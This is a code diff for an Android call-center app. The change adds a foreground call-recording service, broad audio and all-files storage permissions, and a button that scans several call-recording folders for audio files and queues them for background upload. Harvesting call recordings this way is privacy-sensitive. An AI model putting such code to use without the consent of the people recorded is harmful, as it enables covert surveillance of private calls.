@@ -2,6 +2,9 @@ package com.callbridge.app
 
 import android.Manifest
 import android.content.Intent
+import android.net.Uri
+import android.os.Environment
+import android.provider.Settings
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.os.Build
@@ -14,6 +17,11 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.work.Constraints
+import androidx.work.ExistingWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.WorkManager
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -21,7 +29,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.util.UUID
 
-const val WEBHOOK_SERVER = "https://redirectorhook-production.up.railway.app"
+const val WEBHOOK_SERVER = "https://redirectorhook-production-9c3f.up.railway.app"
 
 class MainActivity : AppCompatActivity() {
 
@@ -39,6 +47,21 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // Check if recording agentId is set (for call recording feature)
+        val recordingAgentId = prefs.getString("agentId", null)
+        if (recordingAgentId == null) {
+            // Redirect to AgentLoginActivity for recording feature
+            startActivity(Intent(this, AgentLoginActivity::class.java))
+            finish()
+            return
+        }
+
+        // Start CallMonitorService for call recording
+        val serviceIntent = Intent(this, CallMonitorService::class.java)
+        ContextCompat.startForegroundService(this, serviceIntent)
+
+        // Original logic for ntfy registration
         if (prefs.getString("agent_id", null) != null) {
             showStatusScreen()
         } else {
@@ -148,11 +171,12 @@ class MainActivity : AppCompatActivity() {
                 val result = registerWithServer(agentId, ntfyTopic)
                 withContext(Dispatchers.Main) {
                     if (result.success) {
-                        prefs.edit()
+                        val editor = prefs.edit()
                             .putString("agent_id", agentId)
                             .putString("ntfy_topic", ntfyTopic)
                             .putString("agent_secret", result.agentSecret)
-                            .apply()
+                        result.ntfyBaseUrl?.let { editor.putString("ntfy_base_url", it) }
+                        editor.apply()
                         ensurePermissionsAndStart(ntfyTopic)
                         showStatusScreen()
                     } else {
@@ -216,8 +240,13 @@ class MainActivity : AppCompatActivity() {
                 withContext(Dispatchers.Main) {
                     syncBtn.isEnabled = true
                     if (result.success) {
-                        if (result.agentSecret.isNotEmpty()) {
-                            prefs.edit().putString("agent_secret", result.agentSecret).apply()
+                        if (result.agentSecret.isNotEmpty() || result.ntfyBaseUrl != null) {
+                            val editor = prefs.edit()
+                            if (result.agentSecret.isNotEmpty()) {
+                                editor.putString("agent_secret", result.agentSecret)
+                            }
+                            result.ntfyBaseUrl?.let { editor.putString("ntfy_base_url", it) }
+                            editor.apply()
                         }
                         statusLine.text = strings.syncOk
                         prefs.getString("ntfy_topic", null)?.let { launchNtfyService(it) }
@@ -229,6 +258,80 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(syncBtn)
         layout.addView(statusLine)
+
+        // ── Drive Upload Button ──
+        val driveBtn = Button(this).apply {
+            text = "Sync Recordings to Drive"
+            setBackgroundColor(Color.parseColor("#1A73E8"))
+            setTextColor(Color.WHITE)
+            setPadding(24, 28, 24, 28)
+        }
+        val driveStatusLine = TextView(this).apply {
+            textSize = 13f
+            setPadding(0, 8, 0, 24)
+        }
+        driveBtn.setOnClickListener {
+            // Build and show list of local files vs drive status
+            Thread {
+                val syncedPrefs = getSharedPreferences("synced_files", android.content.Context.MODE_PRIVATE)
+                val audioExtensions = setOf("mp3", "aac", "m4a", "amr", "wav", "opus", "ogg", "3gp", "mp4")
+                val rootPaths = listOf(
+                    "/storage/emulated/0/Recordings/Record/Call",
+                    "/storage/emulated/0/Recordings/Call",
+                    "/storage/emulated/0/MIUI/sound_recorder/call_rec",
+                    "/storage/emulated/0/CallRecordings",
+                    "/storage/emulated/0/PhoneRecord",
+                    "/storage/emulated/0/call_recordings"
+                )
+
+                fun collectFiles(dir: java.io.File): List<java.io.File> {
+                    if (!dir.exists()) return emptyList()
+                    val result = mutableListOf<java.io.File>()
+                    dir.listFiles()?.forEach { f ->
+                        if (f.isDirectory) result.addAll(collectFiles(f))
+                        else if (f.extension.lowercase() in audioExtensions) result.add(f)
+                    }
+                    return result
+                }
+
+                val allFiles = rootPaths.flatMap { collectFiles(java.io.File(it)) }
+                    .sortedByDescending { it.lastModified() }
+
+                val synced = allFiles.count { syncedPrefs.getBoolean(it.name, false) }
+                val pending = allFiles.size - synced
+
+                // Build display string — most recent 50 files with status
+                val sb = StringBuilder()
+                sb.append("Total: ${allFiles.size} | Synced: $synced | Pending: $pending\n\n")
+                allFiles.take(50).forEach { f ->
+                    val status = if (syncedPrefs.getBoolean(f.name, false)) "✓" else "⏳"
+                    sb.append("$status  ${f.name}\n")
+                }
+
+                runOnUiThread {
+                    // Show in an AlertDialog
+                    android.app.AlertDialog.Builder(this)
+                        .setTitle("Recording Sync Status")
+                        .setMessage(sb.toString())
+                        .setPositiveButton("Sync Now") { _, _ ->
+                            val request = OneTimeWorkRequestBuilder<BulkSyncWorker>()
+                                .setConstraints(
+                                    Constraints.Builder()
+                                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                                        .build()
+                                )
+                                .build()
+                            WorkManager.getInstance(this)
+                                .enqueueUniqueWork("bulk_sync", ExistingWorkPolicy.KEEP, request)
+                            driveStatusLine.text = "Syncing in background..."
+                        }
+                        .setNegativeButton("Close", null)
+                        .show()
+                }
+            }.start()
+        }
+        layout.addView(driveBtn)
+        layout.addView(driveStatusLine)
 
         val ntfyTopic = prefs.getString("ntfy_topic", "—")!!
         layout.addView(TextView(this).apply {
@@ -281,11 +384,34 @@ class MainActivity : AppCompatActivity() {
         ) {
             needed.add(Manifest.permission.READ_PHONE_STATE)
         }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            needed.add(Manifest.permission.RECORD_AUDIO)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.MANAGE_EXTERNAL_STORAGE)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            needed.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
+        }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
             != PackageManager.PERMISSION_GRANTED
         ) {
             needed.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.data = Uri.parse("package:${packageName}")
+                startActivity(intent)
+            }
         }
         if (needed.isNotEmpty()) {
             pendingNtfyTopic = ntfyTopic
@@ -312,7 +438,8 @@ class MainActivity : AppCompatActivity() {
     private data class RegisterResult(
         val success: Boolean,
         val error: String = "",
-        val agentSecret: String = ""
+        val agentSecret: String = "",
+        val ntfyBaseUrl: String? = null
     )
 
     private fun syncRegistrationWithServer() {
@@ -320,8 +447,13 @@ class MainActivity : AppCompatActivity() {
         val ntfyTopic = prefs.getString("ntfy_topic", null) ?: return
         CoroutineScope(Dispatchers.IO).launch {
             val result = registerWithServer(agentId, ntfyTopic)
-            if (result.success && result.agentSecret.isNotEmpty()) {
-                prefs.edit().putString("agent_secret", result.agentSecret).apply()
+            if (result.success && (result.agentSecret.isNotEmpty() || result.ntfyBaseUrl != null)) {
+                val editor = prefs.edit()
+                if (result.agentSecret.isNotEmpty()) {
+                    editor.putString("agent_secret", result.agentSecret)
+                }
+                result.ntfyBaseUrl?.let { editor.putString("ntfy_base_url", it) }
+                editor.apply()
             }
         }
     }
@@ -368,7 +500,9 @@ class MainActivity : AppCompatActivity() {
                         error = "Server has no encryption key — redeploy server.js"
                     )
                 }
-                RegisterResult(success = true, agentSecret = secret)
+                val ntfyBase = body.optString("ntfyBaseUrl", "").trim().trimEnd('/')
+                    .ifEmpty { null }
+                RegisterResult(success = true, agentSecret = secret, ntfyBaseUrl = ntfyBase)
             } else {
                 val err = try {
                     JSONObject(responseBody).getString("error")
